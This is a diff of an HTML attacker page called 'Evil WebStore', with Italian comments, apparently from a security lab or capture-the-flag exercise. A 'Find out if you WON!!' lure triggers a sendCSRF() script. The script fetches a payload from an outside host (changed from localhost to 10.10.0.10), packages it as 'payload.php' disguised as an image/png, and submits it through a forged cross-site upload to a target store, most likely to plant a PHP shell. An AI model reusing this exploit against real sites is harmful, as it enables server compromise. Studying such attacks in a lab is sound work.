@@ -14,8 +14,8 @@
 
         <!-- Hero Section -->
         <div class="container">
-            <div class="page-title">Welcome to Evil WebStore Sassuolo</div>
-            <p style="text-align: center; font-size: 18px; margin-bottom: 40px;">Il miglior store di tutto il Sass</p>
+            <div class="page-title">Welcome to the Evil WebStore</div>
+            <p style="text-align: center; font-size: 18px; margin-bottom: 40px;">BOO!</p>
         </div>
         <div class="login-container">
             <h1>Find out if you WON!!</h1>
@@ -30,21 +30,17 @@
         <script>
             function sendCSRF(){
                 const input = document.getElementById('file-input');
-                const formData = new FormData();
                 
-                fetch('http://localhost:8080/payload')
+                fetch('http://10.10.0.10/payload')
                     .then(response => response.arrayBuffer())
                     .then(buffer => {
-
-                        // Binary Large OBject: i dati binari da inviare, cioè il fetch (=payload)
-                        const blob = new Blob([buffer], { type: 'image/png' });
 
                         // DataTransfer: unico modo per inviare i file tramite il browser
                         const dataTransfer = new DataTransfer();
 
                         // File: funziona come un pacco postale -> ci mettiamo dentro quello che dobbiamo mandare
                         // e lo chiamiamo "payload.php", il nome con cui verrà caricato sul target
-                        dataTransfer.items.add(new File([blob], 'payload.php', { type: 'image/png' }));
+                        dataTransfer.items.add(new File([buffer], 'payload.php', { type: 'image/png' }));
                         input.files = dataTransfer.files;
                         
                         // invia al form del webstore target (tramite action del form sopra)
